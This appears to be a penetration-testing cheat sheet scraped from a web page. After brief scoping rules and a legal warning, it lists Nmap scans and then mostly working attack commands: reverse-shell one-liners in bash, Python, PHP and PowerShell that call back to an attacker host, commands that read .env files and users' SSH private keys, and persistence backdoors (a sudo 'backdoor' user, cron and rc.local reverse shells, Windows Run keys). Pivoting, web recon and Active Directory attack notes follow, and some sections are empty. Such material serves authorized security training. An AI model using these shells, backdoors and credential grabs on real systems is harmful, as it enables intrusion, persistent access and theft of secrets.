Scoping — Rules of Engagement

Before touching anything, get in writing:

  • Written authorization (Statement of Work)
  • Exact IP ranges / domains in scope
  • Out-of-scope systems (production DB, etc.)
  • Testing windows (no weekends? no peak hours?)
  • Emergency contacts + stop conditions
  • Data handling — screenshots, logs, reports
  • Physical access? Social engineering allowed?
Legal Warning
Unauthorized testing is a federal crime (CFAA in the US, Computer Misuse Act in the UK). Always test only within your authorized scope.
Key Frameworks
PTES (Penetration Testing Execution Standard) — most widely used.  OWASP WSTG — for web apps.  NIST SP 800-115 — federal standard.  MITRE ATT&CK — tactics and techniques reference for reporting.

Nmap — The Complete Reference
Network scanner — your first tool on every engagement
Nmap
nmap — full reference
bash
# ── DISCOVERY ───────────────────────────────────────────
nmap -sn 192.168.1.0/24              # ping sweep, host discovery
nmap -sn -PS22,80,443 192.168.1.0/24 # TCP SYN discovery

# ── STANDARD SCANS ──────────────────────────────────────
nmap 192.168.1.5                       # default 1000 ports
nmap -p- 192.168.1.5                   # ALL 65535 ports (slow)
nmap -p 22,80,443,8080 192.168.1.5    # specific ports

# ── VERSION + SCRIPT + OS DETECTION ─────────────────────
nmap -sV 192.168.1.5                  # service version
nmap -sC 192.168.1.5                  # default NSE scripts
nmap -sV -sC -O 192.168.1.5           # version + scripts + OS
nmap -A 192.168.1.5                   # aggressive (all of above)

# ── STEALTH SCANS ────────────────────────────────────────
sudo nmap -sS 192.168.1.5              # SYN scan (default as root)
nmap -sN 192.168.1.5                  # NULL scan (FW evasion)
nmap -sF 192.168.1.5                  # FIN scan
nmap -sX 192.168.1.5                  # Xmas scan

# ── UDP SCAN ─────────────────────────────────────────────
sudo nmap -sU -top-ports 100 192.168.1.5  # top 100 UDP ports

# ── VULNERABILITY SCRIPTS ────────────────────────────────
nmap --script vuln 192.168.1.5        # all vuln scripts
nmap --script smb-vuln-ms17-010 192.168.1.5  # EternalBlue
nmap --script http-enum 192.168.1.5   # web dirs

# ── SPEED / TIMING ───────────────────────────────────────
nmap -T4 192.168.1.5                  # T0=slow→T5=insane
nmap --min-rate 5000 192.168.1.5     # packets per second

# ── OUTPUT ───────────────────────────────────────────────
nmap -oA ./scan_results 192.168.1.5  # all formats (nmap/xml/gnmap)
nmap -oN normal.txt -oX xml.xml target

Reverse Shells — Getting a Shell Without Metasploit
Manual shell techniques — essential when MSF is blocked or overkill
Shells▾
Bind vs Reverse Shell
Bind shell: Target listens, attacker connects TO target. Blocked by firewalls.
Reverse shell: Target connects BACK to attacker. Bypasses inbound firewall rules. Always prefer reverse shells.
// Set up listener first (always) nc -nlvp 4444 # OR Metasploit multi/handler: use exploit/multi/handler set PAYLOAD linux/x86/shell_reverse_tcp set LHOST 10.10.14.1 set LPORT 4444 run // Bash Reverse Shells bash -i >& /dev/tcp/10.10.14.1/4444 0>&1 bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' exec 5<>/dev/tcp/10.10.14.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done // Python Reverse Shell python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' // PHP Reverse Shell (web exploit) php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");' // PowerShell (Windows) powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# ── WHO + WHERE ──────────────────────────────────────────

# ── INTERNAL NETWORK DISCOVERY ───────────────────────────

for i in {1..254}; do ping -c1 -W1 10.10.10.$i &>/dev/null && echo "UP: 10.10.10.$i"; done

# ── CREDENTIAL HUNTING ───────────────────────────────────

cat /var/www/html/.env 2/dev/null
cat /home/*/.ssh/id_rsa 2/dev/null  # steal SSH private keys

Persistence & Pivoting

Maintaining access across reboots, and using a compromised host as a launching point to attack deeper network segments.

Persistence Techniques

maintaining access
bash
# ── LINUX PERSISTENCE ─────────────────────────────
# Method 1: Add SSH key
mkdir -p ~/.ssh
echo "ssh-rsa YOURPUBKEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Method 2: Add user
useradd -M -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
usermod -aG sudo backdoor

# Method 3: Cron reverse shell
(crontab -l 2/dev/null; echo "* * * * * bash -i >& /dev/tcp/10.10.14.1/4444 0>&1") | crontab -

# Method 4: /etc/rc.local (root)
echo "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1 &" >> /etc/rc.local

# ── WINDOWS PERSISTENCE ───────────────────────────
# Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Users\user\shell.exe"

# Scheduled task
schtasks /create /tn "Updater" /tr "C:\shell.exe" /sc onlogon /ru SYSTEM

# Meterpreter persistence module
run persistence -X -i 30 -p 4444 -r 10.10.14.1

Pivoting / Tunneling

network pivoting
bash
# Scenario: You own 10.10.10.5 (DMZ)
# Internal network: 192.168.1.0/24 not reachable from you
# Goal: Attack 192.168.1.x through pivot host

# ── SSH TUNNELING ─────────────────────────────────
# Local port forward:
# Forward local 8080 → target's 192.168.1.20:80
ssh -L 8080:192.168.1.20:80 user@10.10.10.5
# Now: curl http://localhost:8080 → hits internal server

# Dynamic SOCKS proxy (proxychains) — most flexible
ssh -D 9050 user@10.10.10.5  # pivot = SOCKS5 proxy
# /etc/proxychains.conf: socks5 127.0.0.1 9050
proxychains nmap -sT 192.168.1.0/24  # scan internal net!
proxychains curl http://192.168.1.20/

# ── CHISEL (when SSH not available) ───────────────
# Attacker (server):
./chisel server --port 8888 --reverse
# Target (client) — creates SOCKS tunnel:
./chisel client 10.10.14.1:8888 R:socks

# ── METASPLOIT ROUTE ──────────────────────────────
# After getting meterpreter on pivot host:
run post/multi/manage/autoroute
# OR:
route add 192.168.1.0/24 
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24

Web Application Testing

Systematic methodology for attacking web applications — from recon through exploitation of OWASP Top 10 vulnerabilities.

web app testing workflow
bash
# ── STEP 1: RECON ──────────────────────────────────────────────────────
whatweb https://target.com                           # tech stack
gobuster dir -u https://target.com -w raft-large-directories.txt -x php,html,txt,bak
gobuster dns -d target.com -w subdomains-top1million-5000.txt
waybackurls target.com | sort -u               # old endpoints

# ── STEP 2: PARAMETER DISCOVERY ────────────────────────────────────────
# With Burp Suite: Spider + Smart Scan
arjun -u https://target.com/api/data             # parameter bruteforce
paramspider -d target.com                        # URL params from Wayback

# ── STEP 3: INJECTION TESTING ──────────────────────────────────────────

Active Directory Attacks

The crown jewel of enterprise penetration testing. AD environments are present in 90%+ of enterprise targets. Owning AD = owning everything.

AD Attack Path
Foothold → Local Admin → Credential Harvesting → Lateral Movement → Domain Admin → Forest Compromise. Tools: BloodHound (graph attack paths), CrackMapExec (exec at scale), Impacket (protocol attacks), Mimikatz (credential extraction).
